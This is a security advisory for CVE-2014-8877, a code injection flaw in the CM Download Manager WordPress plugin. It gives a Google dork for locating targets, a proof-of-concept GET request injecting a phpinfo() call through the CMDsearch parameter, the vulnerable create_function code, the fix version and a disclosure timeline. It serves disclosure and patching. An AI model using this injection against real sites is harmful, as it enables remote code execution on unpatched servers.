CVE: CVE-2014-8877 
Plugin: CM Download Manager plugin
Vendor: CreativeMinds - https://www.cminds.com/
Fixed version: 2.0.4
Google dork: inurl:cmdownloads
Reported by: Phi Le Ngoc - phi.n.le@itas.vn
Credits to ITAS Team - www.itas.vn


::DESCRITION::
 
The code injection vulnerability has been found and confirmed within the software as an anonymous user. A successful attack could allow an anonymous attacker gains full control of the application and the ability to use any operating system functions that are available to the scripting environment. 

GET /cmdownloads/?CMDsearch=".phpinfo()." HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: _ga=GA1.2.1698795018.1415614778; _gat=1; PHPSESSID=okt6c51s4esif2qjq451ati7m6; cmdm_disclaimer=Y; JSB=1415614988879 
Connection: keep-alive

Vulnerable file:/wp-content/plugins/cm-download-manager/lib/controllers/CmdownloadController.php
Vulnerable code: (Line: 130 -> 158)


public static function alterSearchQuery($search, $query)
    {
        if( ( (isset($query->query_vars[&#039;post_type&#039;]) && $query->query_vars[&#039;post_type&#039;] == CMDM_GroupDownloadPage::POST_TYPE) && (!isset($query->query_vars[&#039;widget&#039;]) || $query->query_vars[&#039;widget&#039;] !== true) ) && !$query->is_single && !$query->is_404 && !$query->is_author && isset($_GET[&#039;CMDsearch&#039;]) )
        {
            global $wpdb;
            $search_term = $_GET[&#039;CMDsearch&#039;];
            if( !empty($search_term) )
            {
                $search = &#039;&#039;;
                $query->is_search = true;
                // added slashes screw with quote grouping when done early, so done later
                $search_term = stripslashes($search_term);
                $terms = array_map(&#039;_search_terms_tidy&#039;, $matches[0]);

                $n = &#039;%&#039;;
                $searchand = &#039; AND &#039;;
                foreach((array) $terms as $term)
                {
                    $term = esc_sql(like_escape($term));
                    $search .= "{$searchand}(($wpdb->posts.post_title LIKE &#039;{$n}{$term}{$n}&#039;) OR ($wpdb->posts.post_content LIKE &#039;{$n}{$term}{$n}&#039;))";
                }
                add_filter(&#039;get_search_query&#039;, create_function(&#039;$q&#039;, &#039;return "&#039; . $search_term . &#039;";&#039;), 99, 1);
                remove_filter(&#039;the_posts&#039;, &#039;relevanssi_query&#039;);
            }
        }
        return $search;
}

::SOLUTION::
Update to version 2.0.4

::DISCLOSURE::
2014-11-08 initial vendor contact
2014-11-10 vendor response
2014-11-10 vendor confirmed 
2014-11-11 vendor release patch
2014-11-14 public disclosure

